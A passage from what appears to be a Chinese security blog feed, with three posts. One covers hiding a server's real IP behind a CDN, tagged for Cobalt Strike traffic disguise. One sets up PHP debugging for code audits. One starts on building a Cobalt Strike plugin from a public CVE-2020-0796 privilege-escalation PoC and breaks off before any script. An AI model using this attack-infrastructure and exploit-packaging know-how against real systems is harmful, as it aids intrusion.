number">96.0</span><span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">190.93</span><span class="token punctuation">.</span><span class="token number">240.0</span><span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">197.234</span><span class="token punctuation">.</span><span class="token number">240.0</span><span class="token operator">/</span><span class="token number">22</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">198.41</span><span class="token punctuation">.</span><span class="token number">128.0</span><span class="token operator">/</span><span class="token number">17</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">2400</span><span class="token punctuation">:</span>cb00<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token number">32</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">2606</span><span class="token punctuation">:</span><span class="token number">4700</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token number">32</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">2803</span><span class="token punctuation">:</span>f800<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token number">32</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">2405</span><span class="token punctuation">:</span>b500<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token number">32</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">2405</span><span class="token punctuation">:</span><span class="token number">8100</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token number">32</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> 2c0f<span class="token punctuation">:</span>f248<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token number">32</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> 2a06<span class="token punctuation">:</span>98c0<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token number">29</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#从请求头中获取IP</span>        <span class="token keyword">real_ip_header</span> CF<span class="token operator">-</span>Connecting<span class="token operator">-</span>IP<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#将CF-Connecting-IP里不在set_real_ip_from中的IP当做真实IP</span>        real_ip_recursive on<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#使用$remote_addr</span>        <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Forwarded<span class="token operator">-</span>For <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#日志记录</span>        <span class="token keyword">access_log</span>  logs<span class="token operator">/</span>www<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>com<span class="token punctuation">.</span>log  main<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里要注意一下，如果网站使用了HTTPS，默认情况下CDN会将http重写为https,存在原来80端口的服务访问不了的情况，可以在cdn中关闭自动重写：<br><img src="https://i.loli.net/2021/08/10/hVaCODR4tbjI9zw.png"></p><h2 id="Nginx中server-name的配置"><a href="#Nginx中server-name的配置" class="headerlink" title="Nginx中server_name的配置"></a>Nginx中server_name的配置</h2><p>nginx中使用server_name定义虚拟主机名，设置server_name指定要处理的域名：</p><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>    <span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>    <span class="token keyword">server_name</span> www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">200</span> <span class="token string">'baidu found!'</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">server</span> <span class="token punctuation">{</span>    <span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>    <span class="token keyword">server_name</span> www<span class="token punctuation">.</span>qq<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">200</span> <span class="token string">'qq found!'</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/07/21/R6nbVug1tOWhXca.png"></p><p>其他的默认情况：</p><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span><span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span><span class="token keyword">server_name</span> _<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#可以对host进行一些判断</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$host</span> <span class="token operator">!=</span> <span class="token string">"www.qq.com"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">501</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">200</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>｝<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/07/21/NKA53bUMi1GjelI.png"></p><p><img src="https://i.loli.net/2021/07/21/SpfTPxj4sc68AVU.png"></p><h2 id="Nginx使用WAF"><a href="#Nginx使用WAF" class="headerlink" title="Nginx使用WAF"></a>Nginx使用WAF</h2><p>使用waf可以防御一些恶意扫描，这里使用了<a href="http://openresty.org/cn/">openresty</a>来使用lua的<a href="https://github.com/unixhot/waf">waf</a>，将waf代码放到lua/waf下，然后在nginx配置文件http段中添加引入即可：<br><img src="https://i.loli.net/2021/08/03/oNHk7TExQghsIAJ.png"></p><pre class="line-numbers language-nginx"><code class="language-nginx">    <span class="token comment" spellcheck="true"># WAF</span>    lua_shared_dict limit 50m<span class="token punctuation">;</span>    lua_package_path <span class="token string">"./lua\waf/?.lua;;"</span><span class="token punctuation">;</span>    init_by_lua_file <span class="token string">"./lua/waf/init.lua"</span><span class="token punctuation">;</span>    access_by_lua_file <span class="token string">"./lua/waf/access.lua"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以在config.lua中进行详细的配置:<br><img src="https://i.loli.net/2021/08/03/ovENWjJAMLgFTy3.png"><br>触发规则会进行拦截:<br><img src="https://i.loli.net/2021/08/03/XNhlgasn3ecwYbZ.png"><br>各种规则可以在rule-config中详细配置。</p><h2 id="针对来源IP限制返回内容"><a href="#针对来源IP限制返回内容" class="headerlink" title="针对来源IP限制返回内容"></a>针对来源IP限制返回内容</h2><p>有时候请求不是走正常路径过来的，可以设置nginx只对CDN来源IP开放访问，其他地址拒绝(这个会和获取真实IP那个冲突，获取真实IP可以写在location块里，就不要写在server里了)：</p><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">http</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">#通过if判断值，如果是是CDN的IP，$allow_ip = 0,否则就是default 1。</span>    <span class="token keyword">geo</span> <span class="token variable">$allow_ip</span> <span class="token punctuation">{</span>        default             <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token number">173.245</span><span class="token punctuation">.</span><span class="token number">48.0</span><span class="token operator">/</span><span class="token number">20</span>    <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">103.21</span><span class="token punctuation">.</span><span class="token number">244.0</span><span class="token operator">/</span><span class="token number">22</span>    <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">103.22</span><span class="token punctuation">.</span><span class="token number">200.0</span><span class="token operator">/</span><span class="token number">22</span>    <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">103.31</span><span class="token punctuation">.</span><span class="token number">4.0</span><span class="token operator">/</span><span class="token number">22</span>     <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">141.101</span><span class="token punctuation">.</span><span class="token number">64.0</span><span class="token operator">/</span><span class="token number">18</span>    <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">108.162</span><span class="token punctuation">.</span><span class="token number">192.0</span><span class="token operator">/</span><span class="token number">18</span>   <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">190.93</span><span class="token punctuation">.</span><span class="token number">240.0</span><span class="token operator">/</span><span class="token number">20</span>    <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">188.114</span><span class="token punctuation">.</span><span class="token number">96.0</span><span class="token operator">/</span><span class="token number">20</span>    <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">197.234</span><span class="token punctuation">.</span><span class="token number">240.0</span><span class="token operator">/</span><span class="token number">22</span>   <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">198.41</span><span class="token punctuation">.</span><span class="token number">128.0</span><span class="token operator">/</span><span class="token number">17</span>    <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">162.158</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token operator">/</span><span class="token number">15</span>     <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">104.16</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token operator">/</span><span class="token number">12</span>      <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">172.64</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token operator">/</span><span class="token number">13</span>      <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">131.0</span><span class="token punctuation">.</span><span class="token number">72.0</span><span class="token operator">/</span><span class="token number">22</span>      <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">server</span>  <span class="token punctuation">{</span>        <span class="token keyword">listen</span> <span class="token number">80</span> default<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#任意host</span>        <span class="token keyword">server_name</span> _<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">#以http对IP的访问，不是来自允许的源不提供服务，返回301。</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$allow_ip</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token number">301</span><span class="token punctuation">;</span><span class="token punctuation">}</span>         <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true"># 返回内容</span>                <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="防止HTTPS访问IP泄露证书"><a href="#防止HTTPS访问IP泄露证书" class="headerlink" title="防止HTTPS访问IP泄露证书"></a>防止HTTPS访问IP泄露证书</h2><p>有时候会发现我们VPS的真实IP泄露了，在nginx配置不当时，就可以通过证书泄露IP，通过fofa看到在该IP上的证书：<br><img src="https://i.loli.net/2021/07/21/a4t9ZCTqcAwO3rK.png"><br>如果要防止nginx泄露IP，不能通过下列检查host来防御，依然会返回证书：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$host</span> <span class="token operator">!=</span> <span class="token string">"www.qq.com"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> 400<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>一、可以给IP配置一个自签名的证书，通过https访问IP时返回的就是这个自签名的证书<br>1.免费证书获取可以在csr.chinassl.net和Let’s Encrypt获取，以csr.chinassl.net为例：<br><img src="https://i.loli.net/2021/07/21/pEJN2s3IwTVPCB8.png"><br>然后下载得到CSR文件和KEY文件，然后上传CSR生成证书即可：<br><img src="https://i.loli.net/2021/07/21/eg9ADmYodHzXkOt.png"><br>获取后会得到.crt文件，在nginx中配置即可。</p><p>当然了,还可以使用使用openssl（windows下载:<a href="https://slproweb.com/products/Win32OpenSSL.html%EF%BC%89%E5%91%BD%E4%BB%A4%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8D%E7%9A%84%E8%AF%81%E4%B9%A6%EF%BC%9A">https://slproweb.com/products/Win32OpenSSL.html）命令生成自签名的证书：</a></p><pre class="line-numbers language-cmd"><code class="language-cmd">openssl req -x509 -nodes -days 3650 -newkey rsa:2048 -keyout ssl.key -out https.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.nginx配置<br>server_name配置成任意，作为默认配置，没有匹配到server_name时就返回此处配置内容：</p><pre class="line-numbers language-groovy"><code class="language-groovy">server <span class="token punctuation">{</span>    listen <span class="token number">443</span> ssl<span class="token punctuation">;</span>    server_name <span class="token number">_</span><span class="token punctuation">;</span>    ssl_certificate  key<span class="token operator">/</span>xxx<span class="token operator">.</span>com_ssl<span class="token operator">.</span>crt<span class="token punctuation">;</span>    ssl_certificate_key key<span class="token operator">/</span>xxx<span class="token operator">.</span>com_key<span class="token punctuation">;</span>    ssl_session_timeout 5m<span class="token punctuation">;</span>    ssl_ciphers TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">256</span><span class="token operator">-</span>GCM<span class="token operator">-</span>SHA384<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>CHACHA20<span class="token operator">-</span>POLY1305<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">128</span><span class="token operator">-</span>GCM<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">128</span><span class="token operator">-</span>CCM<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">128</span><span class="token operator">-</span>CCM<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>CHACHA20<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>AES128<span class="token punctuation">:</span>RSA<span class="token operator">+</span>AES128<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>AES256<span class="token punctuation">:</span>RSA<span class="token operator">+</span>AES256<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>3DES<span class="token punctuation">:</span>RSA<span class="token operator">+</span>3DES<span class="token punctuation">:</span><span class="token operator">!</span>MD5<span class="token punctuation">;</span>        ssl_protocols TLSv1<span class="token operator">.</span><span class="token number">1</span> TLSv1<span class="token operator">.</span><span class="token number">2</span> TLSv1<span class="token operator">.</span><span class="token number">3</span><span class="token punctuation">;</span>    ssl_prefer_server_ciphers on<span class="token punctuation">;</span>    location <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样一来访问IP就使用这个自签名的证书，访问域名就使用域名的证书，不会造成IP和域名关联。<br>二、不配置证书，使用CDN灵活模式<br>灵活模式是指客户端与CDN进行HTTPS通信，CDN与服务器HTTP通信，这样证书来源直接就是CDN的，nginx只需要在80端口配置即可：<br><img src="https://i.loli.net/2021/07/30/84bqCA6IvBWeOZY.png" alt="灵活模式"><br>边缘证书中设置始终使用HTTPS:<br><img src="https://i.loli.net/2021/07/30/8dlsYFL6ctDTxu4.png"><br>访问网站，查看证书：<br><img src="https://i.loli.net/2021/07/21/bJRVhYvtU1cqyB2.png"><br>这种方式确实灵活,不用配证书,可以将http的访问自动重写为https。还可以在边缘证书中设置一个随机加密(HTTP/2)，访问的时候是http,但是会使用加密：<br><img src="https://i.loli.net/2021/08/19/Ud7rW9RYjEJMDan.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/unixhot/waf">https://github.com/unixhot/waf</a></p><p><a href="https://www.cnblogs.com/Xy--1/p/14396744.html">https://www.cnblogs.com/Xy--1/p/14396744.html</a></p><p><a href="https://support.cloudflare.com/hc/zh-cn/articles/200170786-%E6%81%A2%E5%A4%8D%E5%8E%9F%E5%A7%8B%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E4%BD%BF%E7%94%A8-mod-cloudflare-%E8%AE%B0%E5%BD%95%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E5%9C%B0%E5%9D%80-">https://support.cloudflare.com/hc/zh-cn/articles/200170786-%E6%81%A2%E5%A4%8D%E5%8E%9F%E5%A7%8B%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E4%BD%BF%E7%94%A8-mod-cloudflare-%E8%AE%B0%E5%BD%95%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E5%9C%B0%E5%9D%80-</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
            <tag> 流量伪装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPStorm+PHPStudy调试配置</title>
      <link href="/2021/07/27/phpstudy-phpstorm-de-dai-ma-diao-shi-pei-zhi/"/>
      <url>/2021/07/27/phpstudy-phpstorm-de-dai-ma-diao-shi-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简述"><a href="#0x01-简述" class="headerlink" title="0x01 简述"></a>0x01 简述</h2><p>记录代码审计基础中调试环境的配置，主要使用PHPStudy作为服务器，PHPStorm作为开发调试工具，并配置远程调试和本地调试两种方案。远程调试的优点是不需要本地有PHP环境，缺点是需要修改文件时要同步文件修改到远程；本地调试比较方便快捷一些，但是有时候会遇到BlueTeam代码投毒，审计调试的时候主机被控制。这里对两种调试配置方法进行记录。</p><h2 id="0x02-远程调试配置"><a href="#0x02-远程调试配置" class="headerlink" title="0x02 远程调试配置"></a>0x02 远程调试配置</h2><p>使用PHPStudy + PHPStorm远程调试，不用在本地安装PHP环境，不用web服务器，代码执行都交给远程服务器，配置下列项目即可：<br>远程服务器，PHPSdtudy配置:</p><ol><li>开启FTP服务，目录设置为Web目录，用来同步PHPStorm对文件的修改</li><li>php配置开启Xdebug插件</li></ol><p>本地PHPStorm配置</p><ol><li>PHP远程调试</li><li>PHP Web页面</li></ol><h3 id="PHPSdtudy开启FTP"><a href="#PHPSdtudy开启FTP" class="headerlink" title="PHPSdtudy开启FTP"></a>PHPSdtudy开启FTP</h3><p>在FTP选项里配置好用户名和密码，根目录设置为WEB目录<br><img src="https://i.loli.net/2021/07/27/CLW2Zt856zkRpbH.png"></p><h3 id="PHP开启Xdebug"><a href="#PHP开启Xdebug" class="headerlink" title="PHP开启Xdebug"></a>PHP开启Xdebug</h3><p>在Phpstudy菜单软件管理-PHP-设置-扩展组件-Xdebug中设置，选择启用即可:<br><img src="https://i.loli.net/2021/07/27/Wd2yxL3AQvpH7lO.png"><br>查看配置文件：<br><img src="https://i.loli.net/2021/07/27/SnpyvB6g4Xj5rZU.png"><br>在WEB下新建个index.php，写入<code>&lt;?php phpinfo();?&gt;</code>,然后访问发现Xdebug已启用：<br><img src="https://i.loli.net/2021/07/27/TpH2PtfvSkUnl8o.png"><br>接下来把远程调试开启，需要PHPStorm主机的IP地址(我这里是192.168.200.32)，并开启远程调试：<br><img src="https://i.loli.net/2021/07/27/GQYDx2uEXKjt8hl.png"><br>然后重启nginx服务器，接下来就可以配置PHPStorm了。</p><h3 id="PHPStorm远程调试配置"><a href="#PHPStorm远程调试配置" class="headerlink" title="PHPStorm远程调试配置"></a>PHPStorm远程调试配置</h3><p>远程配置涉及到到代码文件的同步，Web页面的显示，远程调试接口的配置。<br><strong>PHP远程调试</strong><br>首先配置远程调试，这里配置其一是服务器Xdeug扩展，二是本地的文件怎么同步到远程。因为本地在文件中添加了语句，需要同步到远程服务器执行才能看到效果，在菜单:运行-编辑配置-PHP远程调试中:<br><img src="https://i.loli.net/2021/07/27/iWhKrUnZj4LIpO1.png"><br>接下来配置部署服务器，部署就是需要将本地文件上传到远程服务器，就是上传到FTP中：<br><img src="https://i.loli.net/2021/07/27/FOWSUtxLeRA7cwa.png"><br>到这里添加一个FTP服务的连接即可，根路径就是FTP的根路径：<br><img src="https://i.loli.net/2021/07/27/OMBDF42Q7GgVdAv.png"><br>然后在配置映射，即为本地要传到远程的路径：<br><img src="https://i.loli.net/2021/07/27/5zOj1GNBFAwQxSb.png"><br>配置好后点击验证，这一步已经配置好文件同步和远程调试功能了：<br><img src="https://i.loli.net/2021/07/27/ZAOsvQViPlwJyMg.png"><br>由于我们需要实时修改文件，所以在&lt;执行前&gt;这个选项中配置一下同步，选择将文件上传到远程主机，配置下要上传的路径即可：<br><img src="https://i.loli.net/2021/07/27/HEQ6A8JcxwBDYsV.png"></p><p><strong>PHP Web页面</strong><br>这里主要是为了在浏览器中显示执行效果，配置本地浏览器要访问远程URL，触发PHP执行，在菜单运行-编辑配置-PHPWeb页面添加：<br><img src="https://i.loli.net/2021/07/27/SaYoXVqCcUlbgn9.png"><br>配置好远程服务器(文件-设置-PHP-服务器):<br><img src="https://i.loli.net/2021/07/27/oiuvHpkYnAKRf2N.png"><br>配置完成后，可以尝试调试查看效果，选择调试，这里先试试Web页面的，选择了Web的配置，点击Run后，打开了浏览器，并成功命中断点，输出<code>$_SERVER</code>信息，这里的Run每次都会打开浏览器访问URL输出，所以打开窗口后刷新页面即可不用再点Run：<br><img src="https://i.loli.net/2021/07/27/rUveWN3PMyo5ucR.png"><br>打开了浏览器后，就可以选择远程调试的配置了，点击调试按钮：<br><img src="https://i.loli.net/2021/07/27/tZAwMuxzalgUQI6.png"><br>刷新刚才的浏览器页面，命中断点：<br><img src="https://i.loli.net/2021/07/27/wlT2YbmiSLjQI9f.png"><br>如果对文件进行了更新，需要再次点击Debug按钮,对传入参数进行调试:<br><img src="https://i.loli.net/2021/07/27/TwAmpSn96PjxBOW.png"><br>到这里远程调试的环境就配置好了。</p><h2 id="0x03-本地调试配置"><a href="#0x03-本地调试配置" class="headerlink" title="0x03 本地调试配置"></a>0x03 本地调试配置</h2><p>本地调试的效果是可以在PHPStorm中运行、调试脚本，也可以配合浏览器运行、调试，参考上面远程调试的配置，开启PHPstudy的Xdebug配置，然后配置好PHPStorm。</p><h3 id="PHPStorm调试配置"><a href="#PHPStorm调试配置" class="headerlink" title="PHPStorm调试配置"></a>PHPStorm调试配置</h3><p>这里的配置是为了在PHPStorm里运行脚本，在运行-编辑配置-PHP脚本中配置好项目入口文件，php解释器二进制文件的位置即可：<br><img src="https://i.loli.net/2021/07/27/R47yMHgfiXGkZtY.png"><br>执行和调试效果都会在PHPStorm中输出：<br><img src="https://i.loli.net/2021/07/27/5CkyU7NPgYa4jrL.png"></p><h3 id="浏览器插件调试"><a href="#浏览器插件调试" class="headerlink" title="浏览器插件调试"></a>浏览器插件调试</h3><p>在浏览器中使用Xdebug helper插件和 PHPStorm进行调试，这里要设置PHPStorm调试的监听端口，PHPStorm的服务器配置，Xdebug helper的Cookie。<br>1.PHPStorm中调试端口配置(文件-设置-调试)<br><img src="https://i.loli.net/2021/07/27/FYLzdEhJGbqcReD.png"><br>这里注意端口会被php-cgi占用，所以把phpstorm监听的端口改成了9100：<br><img src="https://i.loli.net/2021/07/27/zluYXmLJN2qBsh5.png"><br>相应的在php配置文件也进行了更新：<br><img src="https://i.loli.net/2021/07/27/Bv9K6m2PMxUoHzw.png"></p><p>2.PHPStorm服务器配置(文件-设置-服务器):<br>配置好本地服务器的路径即可<br><img src="https://i.loli.net/2021/07/27/Yu31fFp5mo8I7a6.png"></p><p>3.Xdebug helper插件配置<br>到谷歌商店下载Xdebug helper<br><img src="https://i.loli.net/2021/07/27/GMYcTst6iAvCqQE.png"><br>设置Xdebug helper的PhpStorm Cookie(插件显示在扩展栏上，右键选项):<br><img src="https://i.loli.net/2021/07/27/r3BtNYqCleHgK1i.png"><br>访问可以看到Cookie：<br><img src="https://i.loli.net/2021/07/27/153C8vfejSTIhzW.png"><br>在代码中设置设置断点，刷新浏览器即可看到调试效果：<br><img src="https://i.loli.net/2021/07/27/quBQUjZ1Lclpxgf.png"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>通过对PHP的调试配置，熟悉了PHPStorm和PHPStudy的配置，并成功实现了本地和远程两种调试的配置方法，一般来说在代码安全的情况下，选择本地调试方案比较方便。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHPStorm调试 </tag>
            
            <tag> PHP代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobalt Strike插件之CVE-2020-0796提权脚本开发</title>
      <link href="/2021/04/22/cobalt-strike-cha-jian-zhi-cve-2020-0796-ti-quan-jiao-ben-kai-fa/"/>
      <url>/2021/04/22/cobalt-strike-cha-jian-zhi-cve-2020-0796-ti-quan-jiao-ben-kai-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CVE-2020-0796(Windows SMBv3 Client/Server Remote Code Execution Vulnerability)是在SMB v3协议中存在的内存破坏漏洞，可用于远程RCE或本地提权。本文主要是利用已公开<a href="https://github.com/danigargu/CVE-2020-0796">本地提权POC</a>编写Cobalt Strike的提权插件, 用到了反射DLL的方法，具体可以在<a href="https://www.cobaltstrike.com/aggressor-script/functions.html">开发文档</a>中搜索<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">ReflectiveDll</a>。<br>影响版本：<br>Windows Server, version 1909 (Server Core installation)<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows Server, version 1903 (Server Core installation)<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1903 for 32-bit Systems<br>修补方式：<br>1.安装更新<br>2.Powershell命令禁用压缩功能</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set-ItemProperty</span> <span class="token operator">-</span>Path <span class="token string">"HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters"</span> DisableCompression <span class="token operator">-</span><span class="token function">Type</span> DWORD <span class="token operator">-</span>Value 1 <span class="token operator">-</span>Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x01-项目构建"><a href="#0x01-项目构建" class="headerlink" title="0x01 项目构建"></a>0x01 项目构建</h2><p>首先将ReflectiveDll项目复制到本地，然后将Poc代码<del>抄</del>整合到项目中(编写过程中会报很多错误，需要慢慢根据报错来修改)：<br><img src="https://i.loli.net/2021/04/21/CjV9hBlpDIR3bov.png"><br>修改入口函数,传递参数:<br><img src="https://i.loli.net/2021/04/21/ulTPmw98fxoicep.png"><br>如果不出意外没有报错后，就开始进行编译设置，选择Release x64，使用多字节字符集:<br><img src="https://i.loli.net/2021/04/21/VLoalXHCx9pDtfj.png"><br>代码生成-运行库选择多线程DLL(/MD)或多线程(/MT):<br><img src="https://i.loli.net/2021/04/21/oWbBnT21Xew9YCE.png"><br>关闭pdb的输出：<br><img src="https://i.loli.net/2021/04/21/EbrfyUDex1GqvcN.png"><br>然后就可以进行编译，成功编译后会输出DLL文件：<br><img src="https://i.loli.net/2021/04/22/VjilL6qYImODM7Z.png"><br>测试好的源码地址：<a href="https://github.com/yanghaoi/Cobalt_Strike_CNA/tree/main/CVE-2020-0796_CNA">github~</a></p><h2 id="0x02-CNA脚本编写"><a 